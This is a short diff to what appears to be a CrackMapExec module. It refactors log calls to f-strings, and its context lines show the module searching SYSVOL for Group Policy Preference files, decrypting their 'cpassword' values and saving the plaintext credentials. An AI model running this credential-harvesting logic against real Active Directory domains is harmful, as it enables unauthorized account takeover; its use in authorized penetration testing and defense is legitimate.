@@ -31,7 +31,7 @@ class CMEModule:
                 paths = connection.spider('SYSVOL', pattern=['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'])
 
                 for path in paths:
-                    context.log.info('Found {}'.format(path))
+                    context.log.info(f'Found {path}')
 
                     buf = BytesIO()
                     connection.conn.getFile('SYSVOL', path, buf.write)
@@ -66,11 +66,11 @@ class CMEModule:
 
                             password = self.decrypt_cpassword(props['cpassword'])
 
-                            context.log.success('Found credentials in {}'.format(path))
-                            context.log.highlight('Password: {}'.format(password))
+                            context.log.success(f'Found credentials in {path}')
+                            context.log.highlight(f'Password: {password}')
                             for k,v in props.items():
                                 if k != 'cpassword':
-                                    context.log.highlight('{}: {}'.format(k, v))
+                                    context.log.highlight(f'{k}: {v}')
 
                             hostid = context.db.get_computers(connection.host)[0][0]
                             context.db.add_credential('plaintext', '', username, password, pillaged_from=hostid)
